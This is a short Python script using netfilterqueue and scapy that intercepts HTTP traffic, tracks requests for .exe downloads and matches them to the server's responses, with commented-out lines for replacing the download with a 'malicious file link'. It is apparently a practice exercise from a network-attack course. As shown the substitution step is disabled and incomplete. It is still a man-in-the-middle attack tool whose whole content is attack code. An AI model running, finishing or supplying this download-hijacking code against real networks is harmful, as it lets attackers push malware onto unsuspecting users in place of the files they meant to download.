import netfilterqueue
import scapy.all as scapy

ack_list = []


# This method looks for a request to downlaod a .exe and change the response replacing another .exe through the ack
# seq number
def intercept_packet(packet):
    packet_to_intercept = scapy.IP(packet.get_payload())
    if packet_to_intercept.haslayer(scapy.Raw):  # HTTP
        if packet_to_intercept[scapy.TCP].dport == 80:   # It is an HTTP req
            if ".exe" in packet_to_intercept[scapy.Raw].load:  # Req to download .exe
                print("Download request...")
                ack_list.append(packet_to_intercept[scapy.TCP].ack)

        elif packet_to_intercept[scapy.TCP].sport == 80:  # Its si an HTTP response
            if packet_to_intercept[scapy.TCP].seq in ack_list:  # It is a response for a download req
                ack_list.remove(packet_to_intercept[scapy.TCP].seq)
                # print("Changing download file...")
                # packet_to_intercept[scapy.Raw].load = "Malicious file link"

    packet.accept()


#  Trap packets in the queue so that we can intercept them and they won't be send
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, intercept_packet)
queue.run()
